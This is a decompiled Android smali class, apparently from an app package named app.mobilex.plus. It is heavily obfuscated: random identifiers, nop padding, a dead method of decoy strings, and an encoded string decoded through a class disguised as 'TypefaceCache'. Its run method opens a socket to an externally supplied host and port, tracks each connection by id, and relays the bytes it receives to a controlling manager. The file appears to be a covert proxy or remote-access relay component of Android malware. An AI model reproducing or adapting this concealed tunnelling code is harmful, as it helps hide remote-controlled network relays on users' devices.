.class public final synthetic Lv/s/sRv4BqMbyJ9J;
.super Ljava/lang/Object;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic Ee8d2j4S9Vm5yGuR:I

.field public final synthetic JXn4Qf7zpnLjP5:Lv/s/Mf1Og5l70Bn6TXFI7E;

.field public final synthetic vekpFI4d1Nc4fakF:I

.field public final synthetic w9sT1Swbhx3hs:Ljava/lang/String;


# direct methods
.method public synthetic constructor <init>(Ljava/lang/String;ILv/s/Mf1Og5l70Bn6TXFI7E;I)V
    .locals 0

    .line 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 2
    .line 3
    .line 4
    iput-object p1, p0, Lv/s/sRv4BqMbyJ9J;->w9sT1Swbhx3hs:Ljava/lang/String;

    .line 5
    .line 6
    iput p2, p0, Lv/s/sRv4BqMbyJ9J;->vekpFI4d1Nc4fakF:I

    .line 7
    .line 8
    iput-object p3, p0, Lv/s/sRv4BqMbyJ9J;->JXn4Qf7zpnLjP5:Lv/s/Mf1Og5l70Bn6TXFI7E;

    .line 9
    .line 10
    iput p4, p0, Lv/s/sRv4BqMbyJ9J;->Ee8d2j4S9Vm5yGuR:I

    .line 11
    .line 12
    return-void
.end method

.method private static synthetic rknhgfyokh()V
    .locals 1

    const-string v0, "onPause"

    const-string v0, "ISO-8859-1"

    const-string v0, "net.manager.qofwuwbotu"

    const-string v0, "long_click"

    const-string v0, "onCreate"

    const-string v0, "swipe"

    const-string v0, "Cancel"

    const-string v0, "Settings"

    const-string v0, "loadData"

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 7

    .line 1
    iget-object v0, p0, Lv/s/sRv4BqMbyJ9J;->w9sT1Swbhx3hs:Ljava/lang/String;

    .line 2
    .line 3
    iget v1, p0, Lv/s/sRv4BqMbyJ9J;->vekpFI4d1Nc4fakF:I

    .line 4
    .line 5
    iget-object v2, p0, Lv/s/sRv4BqMbyJ9J;->JXn4Qf7zpnLjP5:Lv/s/Mf1Og5l70Bn6TXFI7E;

    .line 6
    .line 7
    iget v3, p0, Lv/s/sRv4BqMbyJ9J;->Ee8d2j4S9Vm5yGuR:I

    .line 8
    .line 9
    const/4 v4, 0x0

    .line 10
    :try_start_0
    new-instance v5, Ljava/net/Socket;

    .line 11
    .line 12
    invoke-direct {v5}, Ljava/net/Socket;-><init>()V

    .line 13
    .line 14
    .line 15
    new-instance v6, Ljava/net/InetSocketAddress;

    .line 16
    .line 17
    invoke-direct {v6, v0, v1}, Ljava/net/InetSocketAddress;-><init>(Ljava/lang/String;I)V

    .line 18
    .line 19
    .line 20
    const v0, 0x2710

    .line 21
    .line 22
    invoke-virtual {v5, v6, v0}, Ljava/net/Socket;->connect(Ljava/net/SocketAddress;I)V

    .line 23
    .line 24
    .line 25
    invoke-virtual {v5, v4}, Ljava/net/Socket;->setSoTimeout(I)V

    .line 26
    .line 27
    .line 28
    new-instance v0, Lv/s/bYTTp7VwXfKJ;

    .line 29
    .line 30
    invoke-virtual {v5}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    .line 31
    .line 32
    .line 33
    move-result-object v1

    .line 34
    invoke-virtual {v5}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    .line 35
    .line 36
    .line 37
    move-result-object v6

    .line 38
    invoke-direct {v0, v5, v1, v6}, Lv/s/bYTTp7VwXfKJ;-><init>(Ljava/net/Socket;Ljava/io/InputStream;Ljava/io/OutputStream;)V

    .line 39
    .line 40
    .line 41
    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 42
    .line 43
    .line 44
    move-result-object v1

    .line 45
    iget-object v6, v2, Lv/s/Mf1Og5l70Bn6TXFI7E;->JXn4Qf7zpnLjP5:Ljava/util/concurrent/ConcurrentHashMap;

    .line 46
    .line 47
    invoke-virtual {v6, v1, v0}, Ljava/util/concurrent/ConcurrentHashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 48
    .line 49
    .line 50
    invoke-virtual {v2, v3}, Lv/s/Mf1Og5l70Bn6TXFI7E;->Ee8d2j4S9Vm5yGuR(I)V

    .line 51
    .line 52
    .line 53
    const v1, 0x8000

    nop

    .line 54
    .line 55
    .line 56
    new-array v1, v1, [B

    .line 57
    .line 58
    :goto_0
    iget-boolean v6, v0, Lv/s/bYTTp7VwXfKJ;->JXn4Qf7zpnLjP5:Z

    .line 59
    .line 60
    if-eqz v6, :cond_0

    .line 61
    .line 62
    invoke-virtual {v5}, Ljava/net/Socket;->isClosed()Z

    .line 63
    .line 64
    .line 65
    move-result v6
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 66
    if-nez v6, :cond_0

    .line 67
    .line 68
    :try_start_1
    iget-object v6, v0, Lv/s/bYTTp7VwXfKJ;->w9sT1Swbhx3hs:Ljava/io/InputStream;

    .line 69
    .line 70
    invoke-virtual {v6, v1}, Ljava/io/InputStream;->read([B)I

    .line 71
    .line 72
    .line 73
    move-result v6
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 74
    goto :goto_1

    .line 75
    :catchall_0
    move-exception v0

    .line 76
    goto :goto_5

    .line 77
    :catch_0
    const/16 v6, -0x1

    .line 78
    :goto_1
    if-lez v6, :cond_0

    .line 79
    .line 80
    :try_start_2
    invoke-static {v1, v6}, Ljava/util/Arrays;->copyOf([BI)[B

    .line 81
    .line 82
    .line 83
    move-result-object v6

    .line 84
    invoke-virtual {v2, v6, v3}, Lv/s/Mf1Og5l70Bn6TXFI7E;->xDyLpEZyrcKVe0([BI)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 85
    .line 86
    .line 87
    goto :goto_0

    .line 88
    :catch_1
    move-exception v0

    .line 89
    goto :goto_3

    .line 90
    :cond_0
    iget-object v0, v2, Lv/s/Mf1Og5l70Bn6TXFI7E;->JXn4Qf7zpnLjP5:Ljava/util/concurrent/ConcurrentHashMap;

    .line 91
    .line 92
    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 93
    .line 94
    .line 95
    move-result-object v1

    .line 96
    invoke-virtual {v0, v1}, Ljava/util/concurrent/ConcurrentHashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    .line 97
    .line 98
    .line 99
    move-result-object v0

    .line 100
    check-cast v0, Lv/s/bYTTp7VwXfKJ;

    .line 101
    .line 102
    if-eqz v0, :cond_1

    .line 103
    .line 104
    iput-boolean v4, v0, Lv/s/bYTTp7VwXfKJ;->JXn4Qf7zpnLjP5:Z

    .line 105
    .line 106
    :try_start_3
    iget-object v0, v0, Lv/s/bYTTp7VwXfKJ;->dDIMxZXP1V8HdM:Ljava/net/Socket;

    .line 107
    .line 108
    :goto_2
    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    .line 109
    .line 110
    .line 111
    :catch_2
    :cond_1
    invoke-virtual {v2, v3}, Lv/s/Mf1Og5l70Bn6TXFI7E;->vekpFI4d1Nc4fakF(I)V

    .line 112
    .line 113
    .line 114
    goto/16 :goto_4

    .line 115
    :goto_3
    :try_start_4
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 116
    .line 117
    .line 118
    move-result-object v0

    .line 119
    if-nez v0, :cond_2

    .line 120
    .line 121
    const-string v0, "002000790055008900F500BC00C600AE002C0078001B008100F100B600DE00A20027"

    nop

    .line 122
    .line 123
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 124
    .line 125
    .line 126
    move-result-object v0

    .line 127
    :cond_2
    invoke-virtual {v2, v0, v3}, Lv/s/Mf1Og5l70Bn6TXFI7E;->JXn4Qf7zpnLjP5(Ljava/lang/String;I)V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 128
    .line 129
    .line 130
    iget-object v0, v2, Lv/s/Mf1Og5l70Bn6TXFI7E;->JXn4Qf7zpnLjP5:Ljava/util/concurrent/ConcurrentHashMap;

    nop

    nop

    .line 131
    .line 132
    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 133
    .line 134
    .line 135
    move-result-object v1

    .line 136
    invoke-virtual {v0, v1}, Ljava/util/concurrent/ConcurrentHashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    .line 137
    .line 138
    .line 139
    move-result-object v0

    nop

    .line 140
    check-cast v0, Lv/s/bYTTp7VwXfKJ;

    nop

    nop

    .line 141
    .line 142
    if-eqz v0, :cond_1

    .line 143
    .line 144
    iput-boolean v4, v0, Lv/s/bYTTp7VwXfKJ;->JXn4Qf7zpnLjP5:Z

    .line 145
    .line 146
    :try_start_5
    iget-object v0, v0, Lv/s/bYTTp7VwXfKJ;->dDIMxZXP1V8HdM:Ljava/net/Socket;
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    .line 147
    .line 148
    goto/16 :goto_2

    .line 149
    :goto_4
    return-void

    .line 150
    :goto_5
    iget-object v1, v2, Lv/s/Mf1Og5l70Bn6TXFI7E;->JXn4Qf7zpnLjP5:Ljava/util/concurrent/ConcurrentHashMap;

    .line 151
    .line 152
    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 153
    .line 154
    .line 155
    move-result-object v5

    .line 156
    invoke-virtual {v1, v5}, Ljava/util/concurrent/ConcurrentHashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    .line 157
    .line 158
    .line 159
    move-result-object v1

    .line 160
    check-cast v1, Lv/s/bYTTp7VwXfKJ;

    .line 161
    .line 162
    if-eqz v1, :cond_3

    .line 163
    .line 164
    iput-boolean v4, v1, Lv/s/bYTTp7VwXfKJ;->JXn4Qf7zpnLjP5:Z

    .line 165
    .line 166
    :try_start_6
    iget-object v1, v1, Lv/s/bYTTp7VwXfKJ;->dDIMxZXP1V8HdM:Ljava/net/Socket;

    .line 167
    .line 168
    invoke-virtual {v1}, Ljava/net/Socket;->close()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3

    .line 169
    .line 170
    .line 171
    :catch_3
    :cond_3
    invoke-virtual {v2, v3}, Lv/s/Mf1Og5l70Bn6TXFI7E;->vekpFI4d1Nc4fakF(I)V

    .line 172
    .line 173
    .line 174
    throw v0
.end method
